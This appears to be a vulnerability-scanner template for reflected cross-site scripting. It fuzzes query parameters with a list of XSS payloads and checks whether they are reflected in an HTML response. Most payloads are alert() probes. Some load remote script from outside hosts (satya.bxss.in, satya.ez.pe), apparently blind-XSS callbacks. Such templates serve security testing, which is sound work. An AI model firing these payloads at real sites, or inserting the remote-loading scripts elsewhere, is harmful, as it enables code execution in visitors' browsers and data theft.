id: reflected-xss

info:
  name: Reflected Cross Site Scripting
  author: pdteam
  severity: medium
  tags: xss,rxss,dast

variables:
  first: "{{rand_int(10000, 99999)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      reflection:
        - "'\"><{{first}}"
        - "<script>$.getScript(\"//satya.bxss.in\")</script>"
        - "<img src=x onerror=alert({{first}})>"
        - "<script>alert({{first}})</script>"
        - "'><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><script>alert({{first}})</script>"
        - "<body onload=alert({{first}})>"
        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
        - "</script><script src='https://satya.ez.pe'></script>"
        - "<script src=//satya.ez.pe></script>"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
